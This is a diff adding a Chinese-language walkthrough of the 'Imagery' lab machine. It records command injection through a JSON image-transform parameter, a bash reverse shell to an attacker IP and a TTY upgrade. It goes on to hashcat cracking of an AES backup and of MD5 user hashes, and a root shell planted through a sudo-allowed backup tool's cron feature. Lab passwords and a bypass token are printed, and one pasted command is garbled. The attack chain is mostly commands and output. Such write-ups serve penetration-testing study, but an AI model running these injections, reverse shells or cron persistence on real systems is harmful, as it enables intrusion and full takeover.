@@ -808,12 +808,459 @@ Priority: u=0
 ```
 #### 对y值嵌入payload
 ```
-[★]$ nc -lvnp 9000
-listening on [any] 9000 ...
+[★]$ nc -lvnp 9011
+listening on [any] 9011 ...
 
 ```
 ```
-"y":"0;/bin/bash -c 'bin/bash -i >& /dev/tcp/10.10.15.132/9000 0>&1';",
+POST /apply_visual_transform HTTP/1.1
+Host: 10.129.242.164:8000
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
+Accept: */*
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Referer: http://10.129.242.164:8000/
+Content-Type: application/json
+Content-Length: 189
+Origin: http://10.129.242.164:8000
+DNT: 1
+Connection: keep-alive
+Cookie: session=.eJxNjTEOgzAMRe_iuWKjRZno2FNELjGJJWJQ7AwIcfeSAanjf_9J74DAui24fwI4oH5-xlca4AGs75BZwM24KLXtOW9UdBU0luiN1KpS-Tdu5nGa1ioGzkq9rsYEM12JWxk5Y6Syd8m-cP4Ay4kxcQ.aaZ85g.dxHslGstREWmh1SPQmRBygQu3U0
+Sec-GPC: 1
+Priority: u=0
+
+{"imageId":"7f9e0f10-b70f-48bd-92b1-f338ebb69504","transformType":"crop","params":{"x":0,"y":"0;/bin/bash -c '/bin/bash -i >& /dev/tcp/10.10.15.132/9011 0>&1';",
+"width":256,"height":256}}
 ```
-#### URL 编码（Ctrl+U）
+#### Send
+```
+ [★]$ nc -lvnp 9011
+listening on [any] 9011 ...
+connect to [10.10.15.132] from (UNKNOWN) [10.129.242.164] 52478
+bash: cannot set terminal process group (1409): Inappropriate ioctl for device
+bash: no job control in this shell
+web@Imagery:~/web$ python3 -c 'import pty;pty.spawn("/bin/bash")'
+python3 -c 'import pty;pty.spawn("/bin/bash")'
+web@Imagery:~/web$ ^Z
+[1]+  Stopped                 nc -lvnp 9011
+[★]$ stty raw -echo;fg
+nc -lvnp 9011
+             export TERM=xterm
+web@Imagery:~/web$ whoami
+web
+web@Imagery:~/web$ cat bot/admin.py
+from selenium import webdriver
+from selenium.webdriver.chrome.options import Options
+from selenium.webdriver.common.by import By
+from selenium.webdriver.support.ui import WebDriverWait
+from selenium.webdriver.support import expected_conditions as EC
+import tempfile, shutil, time, traceback, uuid, os, glob
+
+# ----- Config -----
+CHROME_BINARY = "/usr/bin/google-chrome"
+USERNAME = "admin@imagery.htb"
+PASSWORD = "strongsandofbeach"
+BYPASS_TOKEN = "K7Zg9vB$24NmW!q8xR0p%tL!"
+APP_URL = "http://0.0.0.0:8000"
+# ------------------
+
+# Clean up old profiles
+for folder in glob.glob("/tmp/chrome-profile-*"):
+</SNIP>
+
+web@Imagery:~/web$ dir
+api_admin.py  api_manage.py  app.py	db.json      static	  uploads
+api_auth.py   api_misc.py    bot	env	     system_logs  utils.py
+api_edit.py   api_upload.py  config.py	__pycache__  templates
+web@Imagery:~/web$ ps -ef |grep chr
+web         6928    5867  0 06:29 pts/0    00:00:00 grep --color=auto chr
+
+```
+#### 下载backup
+```
+web@Imagery:/var/backup$ dir
+web_20250806_120723.zip.aes
+web@Imagery:/var/backup$ python3 -m http.server 8011
+Serving HTTP on 0.0.0.0 port 8011 (http://0.0.0.0:8011/) ...
+```
+```
+[★]$ wget -r http://10.129.242.164:8011
+[★]$ cd 10.129.242.164:8011
+[★]$ ls
+index.html  web_20250806_120723.zip.aes
+[★]$ file web_20250806_120723.zip.aes
+web_20250806_120723.zip.aes: AES encrypted data, version 2, created by "pyAesCrypt 6.1.1"
+```
+#### Google搜索 hashcat GitHub 
+#### //为什么"pyAesCrypt“要搜索'hashcat GitHub' -> /tools/aescrypt2hashcat.pl
+```
+[~/10.129.242.164:8011][★]$ cd ..
+[~][★]$ cd -
+/home/syareya55/10.129.242.164:8011
+[~/10.129.242.164:8011][★]$ wget https://raw.githubusercontent.com/hashcat/hashcat/refs/heads/master/tools/aescrypt2hashcat.pl
+[~/10.129.242.164:8011][★]$ ls
+aescrypt2hashcat.pl  index.html  web_20250806_120723.zip.aes
+[~/10.129.242.164:8011][★]$ perl aescrypt2hashcat.pl web_20250806_120723.zip.aes
+$aescrypt$1*98b981e1c146c078b5462f09618b1341*0dd95827498496b8c8ca334d99b13c28*10c6eeb86b1d71475fc5d52ed52d67c20bd945d53b9ac0940866bc8dfbba72c1*e042d41d09ac2726044d63af1276c49e2c8d5f9eb9da32e58bf36cf4f0ad9c66
+
+[~/10.129.242.164:8011][★]$ vi imagery.aes
+[~/10.129.242.164:8011][★]$ cat imagery.aes
+$aescrypt$1*98b981e1c146c078b5462f09618b1341*0dd95827498496b8c8ca334d99b13c28*10c6eeb86b1d71475fc5d52ed52d67c20bd945d53b9ac0940866bc8dfbba72c1*e042d41d09ac2726044d63af1276c49e2c8d5f9eb9da32e58bf36cf4f0ad9c66
+
+[~/10.129.242.164:8011][★]$ cp /usr/share/wordlists/rockyou.txt.gz .
+[~/10.129.242.164:8011][★]$ gunzip rockyou.txt.gz
+
+[★]$ hashcat imagery.aes rockyou.txt -m 22400
+<SNIP>
+$aescrypt$1*98b981e1c146c078b5462f09618b1341*0dd95827498496b8c8ca334d99b13c28*10c6eeb86b1d71475fc5d52ed52d67c20bd945d53b9ac0940866bc8dfbba72c1*e042d41d09ac2726044d63af1276c49e2c8d5f9eb9da32e58bf36cf4f0ad9c66:bestfriends
+                                                          
+Session..........: hashcat
+Status...........: Cracked
+Hash.Mode........: 22400 (AES Crypt (SHA256))
+Hash.Target......: $aescrypt$1*98b981e1c146c078b5462f09618b1341*0dd958...ad9c66
+```
+#### backup的aes的密码为bestfriends
+```
+[~/10.129.242.164:8011][★]$ cd ..
+[★]$ python3 -m venv .venv
+[★]$ source .venv/bin/activate
+(.venv) [★]$ mv 10.129.242.164:8011/web_20250806_120723.zip.aes .
+(.venv) [★]$ mv web_20250806_120723.zip.aes web.zip.aes
+```
+#### Google搜索:  decrypt with pyAesCrypt //有个AI生成的python代码 复制粘贴
+```
+(.venv) [★]$ pip3 install pyAesCrypt
+(.venv) [★]$ vi decrypt.py
+(.venv) [★]$ cat decrypt.py
+import pyAesCrypt
+
+def decrypt_file_with_pyaescrypt(encrypted_file_path, decrypted_file_path, password):
+    # buffer size
+    buffer_size = 64 * 1024 # 64 KB buffer size
+    
+    try:
+        # decrypt file
+        pyAesCrypt.decryptFile(encrypted_file_path, decrypted_file_path, password, buffer_size)
+        print(f"File '{encrypted_file_path}' decrypted successfully to '{decrypted_file_path}'")
+    except ValueError as e:
+        print(f"Decryption failed: {e}")
+        print("Please check your password or file integrity.")
+    except Exception as e:
+        print(f"An unexpected error occurred: {e}")
+
+# Example usage:
+# Remember to replace 'encrypted.aes', 'decrypted.txt', and 'your_secure_password' 
+# with your actual file names and password.
+decrypt_file_with_pyaescrypt('encrypted.aes', 'decrypted.txt', 'your_secure_password')
+```
+#### 并且填入文本名字和秘密
+```
+# with your actual file names and password.
+decrypt_file_with_pyaescrypt('web.zip.aes', 'decrypted.txt', 'bestfriends')
+```
+#### 运行脚本
+```
+(.venv) [★]$ python3 decrypt.py
+File 'web.zip.aes' decrypted successfully to 'decrypted.txt'
+```
+```
+(.venv) [★]$ ls
+10.129.242.164:8011  decrypt.py  Downloads  my_data   Templates
+cacert.der           Desktop     gnome.jpg  Pictures  Videos
+decrypted.txt        Documents   Music      Public    web.zip.aes
+(.venv) [★]$ mkdir web
+(.venv) [★]$ cd web
+(.venv) [~/web][★]$ file ../decrypted.txt
+../decrypted.txt: Zip archive data, at least v2.0 to extract, compression method=deflate
+(.venv) [~/web][★]$ 7z x ../decrypted.txt
+
+(.venv) [~/web][★]$ ls
+web
+(.venv) [~/web][★]$ cd web
+(.venv) [~/web/web][★]$ ls
+api_admin.py  api_manage.py  app.py     env          templates
+api_auth.py   api_misc.py    config.py  __pycache__  utils.py
+api_edit.py   api_upload.py  db.json    system_logs
+```
+#### 查看db.json
+```
+(.venv) [~/web/web][★]$ cat db.json
+{
+    "users": [
+        {
+            "username": "admin@imagery.htb",
+            "password": "5d9c1d507a3f76af1e5c97a3ad1eaa31",
+            "displayId": "f8p10uw0",
+            "isTestuser": false,
+            "isAdmin": true,
+            "failed_login_attempts": 0,
+            "locked_until": null
+        },
+        {
+            "username": "testuser@imagery.htb",
+            "password": "2c65c8d7bfbca32a3ed42596192384f6",
+            "displayId": "8utz23o5",
+            "isTestuser": true,
+            "isAdmin": false,
+            "failed_login_attempts": 0,
+            "locked_until": null
+        },
+        {
+            "username": "mark@imagery.htb",
+            "password": "01c3d2e5bdaf6134cec0a367cf53e535",
+            "displayId": "868facaf",
+            "isAdmin": false,
+            "failed_login_attempts": 0,
+            "locked_until": null,
+            "isTestuser": false
+        },
+        {
+            "username": "web@imagery.htb",
+            "password": "84e3c804cf1fa14306f26f9f3da177e0",
+            "displayId": "7be291d4",
+            "isAdmin": true,
+            "failed_login_attempts": 0,
+            "locked_until": null,
+            "isTestuser": false
+        }
+    ],
+    "images": [],
+    "bug_reports": [],
+    "image_collections": [
+        {
+            "name": "My Images"
+        },
+        {
+            "name": "Unsorted"
+        },
+        {
+            "name": "Converted"
+        },
+        {
+            "name": "Transformed"
+        }
+    ]
+}
+```
+#### 比之前多了2个用户信息，"mark@imagery.htb" "web@imagery.htb"
+#### 打开网页https://crackstation.net/
+```
+mark@imagery.htb       01c3d2e5bdaf6134cec0a367cf53e535 	md5 	supersmash
+web@imagery.htb        84e3c804cf1fa14306f26f9f3da177e0 	md5    spiderweb1234
+```
+#### 登录用户
+```
+web@Imagery:/var/backup$ su - mark
+Password: 
+mark@Imagery:~$ whoami
+mark
+mark@Imagery:~$ cat user.txt
+```
+### 进一步提权
+```
+mark@Imagery:~$ sudo -l
+Matching Defaults entries for mark on Imagery:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
+    use_pty
+
+User mark may run the following commands on Imagery:
+    (ALL) NOPASSWD: /usr/local/bin/charcol
+```
+```
+mark@Imagery:~$ ls -la /usr/local/bin/charcol
+-rwxr-x--- 1 root root 69 Aug  4  2025 /usr/local/bin/charcol
+mark@Imagery:~$ sudo /usr/local/bin/charcol
+
+  ░██████  ░██                                                  ░██ 
+ ░██   ░░██ ░██                                                  ░██ 
+░██        ░████████   ░██████   ░██░████  ░███████   ░███████  ░██ 
+░██        ░██    ░██       ░██  ░███     ░██    ░██ ░██    ░██ ░██ 
+░██        ░██    ░██  ░███████  ░██      ░██        ░██    ░██ ░██ 
+ ░██   ░██ ░██    ░██ ░██   ░██  ░██      ░██    ░██ ░██    ░██ ░██ 
+  ░██████  ░██    ░██  ░█████░██ ░██       ░███████   ░███████  ░██ 
+                                                                    
+                                                                    
+                                                                    
+Charcol The Backup Suit - Development edition 1.0.0
+
+
+Charcol is already set up.
+To enter the interactive shell, use: charcol shell
+To see available commands and flags, use: charcol help
+```
+#### 查看help
+```
+mark@Imagery:~$ sudo /usr/local/bin/charcol help
+usage: charcol.py [--quiet] [-R] {shell,help} ...
+
+Charcol: A CLI tool to create encrypted backup zip files.
+
+positional arguments:
+  {shell,help}          Available commands
+    shell               Enter an interactive Charcol shell.
+    help                Show help message for Charcol or a specific command.
+
+options:
+  --quiet               Suppress all informational output, showing only
+                        warnings and errors.
+  -R, --reset-password-to-default
+                        Reset application password to default (requires system
+                        password verification).
+```
+#### 输入原来mark的密码重置密码
+```
+mark@Imagery:~$ sudo /usr/local/bin/charcol -R
+
+Attempting to reset Charcol application password to default.
+[2026-03-03 07:41:30] [INFO] System password verification required for this operation.
+Enter system password for user 'mark' to confirm: 
+
+[2026-03-03 07:41:39] [INFO] System password verified successfully.
+Removed existing config file: /root/.charcol/.charcol_config
+Charcol application password has been reset to default (no password mode).
+Please restart the application for changes to take effect.
+```
+#### 运行该应用程序时，它会提示输入标记用户的密码，并提示要查看更改，请重新启动应用程序。
+#### 我们通过 shell 参数重新启动应用程序。这样我们就可以设置新密码和新的主密码短语。
+```
+mark@Imagery:~$ sudo /usr/local/bin/charcol shell
+
+First time setup: Set your Charcol application password.
+Enter '1' to set a new password, or press Enter to use 'no password' mode: 
+Are you sure you want to use 'no password' mode? (yes/no): yes
+[2026-03-03 07:43:04] [INFO] Default application password choice saved to /root/.charcol/.charcol_config
+Using 'no password' mode. This choice has been remembered.
+Please restart the application for changes to take effect.
+mark@Imagery:~$ sudo /usr/local/bin/charcol shell
+
+  ░██████  ░██                                                  ░██ 
+ ░██   ░░██ ░██                                                  ░██ 
+░██        ░████████   ░██████   ░██░████  ░███████   ░███████  ░██ 
+░██        ░██    ░██       ░██  ░███     ░██    ░██ ░██    ░██ ░██ 
+░██        ░██    ░██  ░███████  ░██      ░██        ░██    ░██ ░██ 
+ ░██   ░██ ░██    ░██ ░██   ░██  ░██      ░██    ░██ ░██    ░██ ░██ 
+  ░██████  ░██    ░██  ░█████░██ ░██       ░███████   ░███████  ░██ 
+                                                                    
+                                                                    
+                                                                    
+Charcol The Backup Suit - Development edition 1.0.0
+
+[2026-03-03 07:43:22] [INFO] Entering Charcol interactive shell. Type 'help' for commands, 'exit' to quit.
+charcol> 
+```
+#### 选择help
+```
+charcol> help
+[2026-03-03 07:44:44] [INFO] 
+Charcol Shell Commands:
+
+  Backup & Fetch:
+    backup -i <paths...> [-o <output_file>] [-p <file_password>] [-c <level>] [--type <archive_type>] [-e <patterns...>] [--no-timestamp] [-f] [--skip-symlinks] [--ask-password]
+      Purpose: Create an encrypted backup archive from specified files/directories.
+      Output: File will have a '.aes' extension if encrypted. Defaults to '/var/backup/'.
+      Naming: Automatically adds timestamp unless --no-timestamp is used. If no -o, uses input filename as base.
+      Permissions: Files created with 664 permissions. Ownership is user:group.
+      Encryption:
+        - If '--app-password' is set (status 1) and no '-p <file_password>' is given, uses the application password for encryption.
+        - If 'no password' mode is set (status 2) and no '-p <file_password>' is given, creates an UNENCRYPTED archive.
+      Examples:
+        - Encrypted with file-specific password:
+          backup -i /home/user/my_docs /var/log/nginx/access.log -o /tmp/web_logs -p <file_password> --verbose --type tar.gz -c 9
+        - Encrypted with app password (if status 1):
+          backup -i /home/user/example_file.json
+        - Unencrypted (if status 2 and no -p):
+          backup -i /home/user/example_file.json
+        - No timestamp:
+          backup -i /home/user/example_file.json --no-timestamp
+
+    fetch <url> [-o <output_file>] [-p <file_password>] [-f] [--ask-password]
+      Purpose: Download a file from a URL, encrypt it, and save it.
+      Output: File will have a '.aes' extension if encrypted. Defaults to '/var/backup/fetched_file'.
+      Permissions: Files created with 664 permissions. Ownership is current user:group.
+      Restrictions: Fetching from loopback addresses (e.g., localhost, 127.0.0.1) is blocked.
+      Encryption:
+        - If '--app-password' is set (status 1) and no '-p <file_password>' is given, uses the application password for encryption.
+        - If 'no password' mode is set (status 2) and no '-p <file_password>' is given, creates an UNENCRYPTED file.
+      Examples:
+        - Encrypted:
+          fetch <URL> -o <output_file_path> -p <file_password> --force
+        - Unencrypted (if status 2 and no -p):
+          fetch <URL> -o <output_file_path>
+
+  Integrity & Extraction:
+    list <encrypted_file> [-p <file_password>] [--ask-password]
+      Purpose: Decrypt and list contents of an encrypted Charcol archive.
+      Note: Requires the correct decryption password.
+      Supported Types: .zip.aes, .tar.gz.aes, .tar.bz2.aes.
+      Example:
+        list /var/backup/<encrypted_file_name>.zip.aes -p <file_password>
+
+    check <encrypted_file> [-p <file_password>] [--ask-password]
+      Purpose: Decrypt and verify the structural integrity of an encrypted Charcol archive.
+      Note: Requires the correct decryption password. This checks the archive format, not internal data consistency.
+      Supported Types: .zip.aes, .tar.gz.aes, .tar.bz2.aes.
+      Example:
+        check /var/backup/<encrypted_file_name>.tar.gz.aes -p <file_password>
+
+    extract <encrypted_file> <output_directory> [-p <file_password>] [--ask-password]
+      Purpose: Decrypt an encrypted Charcol archive and extract its contents.
+      Note: Requires the correct decryption password.
+      Example:
+        extract /var/backup/<encrypted_file_name>.zip.aes /tmp/restored_data -p <file_password>
+
+  Automated Jobs (Cron):
+    auto add --schedule "<cron_schedule>" --command "<shell_command>" --name "<job_name>" [--log-output <log_file>]
+      Purpose: Add a new automated cron job managed by Charcol.
+</SNIP>
+```
+#### 根据提示
+#### auto add --schedule "<cron_schedule>" --command "<shell_command>" --name "<job_name>" [--log-output <log_file>]
+```
+[★]$ nc -lvnp 8011
+listening on [any] 8011 ...supersmash
+```
+```
+charcol> auto add --schedule "* * * * *" --command "/bin/bash -c '/bin/& /dev/tcp/10.10.15.132/8011 0>&1'" --name "syareya"
+[2026-03-03 08:07:52] [INFO] System password verification required for this operation.
+Enter system password for user 'mark' to confirm: 
+
+[2026-03-03 08:08:08] [INFO] System password verified successfully.
+[2026-03-03 08:08:08] [INFO] Auto job 'syareya' (ID: dc13d487-c3ce-49bd-b12f-2c6c2625c96f) added successfully. The job will run according to schedule.
+[2026-03-03 08:08:08] [INFO] Cron line added: * * * * * CHARCOL_NON_INTERACTIVE=true /bin/bash -c '/bin/bash -i >& /dev/tcp/10.10.15.132/8011 0>&1'
+
+charcol> exit
+[2026-03-03 08:15:20] [INFO] Exiting Charcol shell.
+mark@Imagery:~$ exit
+logout
+web@Imagery:/var/backup$ exit
+exit
+web@Imagery:~/web$ exit
+                       exit
+```
+#### 反shell
+```
+(.venv) [~/web][★]$ nc -lvnp 8011
+listening on [any] 8011 ...
+connect to [10.10.15.132] from (UNKNOWN) [10.129.242.164] 35728
+bash: cannot set terminal process group (23773): Inappropriate ioctl for device
+bash: no job control in this shell
+root@Imagery:~# dir
+dir
+chrome.deb  root.txt
+root@Imagery:~# cat root.txt 
+cat roo.txt
+cat: roo.txt: No such file or directory
+
+root@Imagery:~# python3 -c 'import pty; pty.spawn("/bin/bash")'
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+root@Imagery:~# ^Z
+[1]+  Stopped                 nc -lvnp 8011
+(.venv) ┌[~/web][★]$ stty raw -echo;fg
+nc -lvnp 8011
+             export TERM=xterm
+root@Imagery:~# cat root.txt
+```
+
+
 
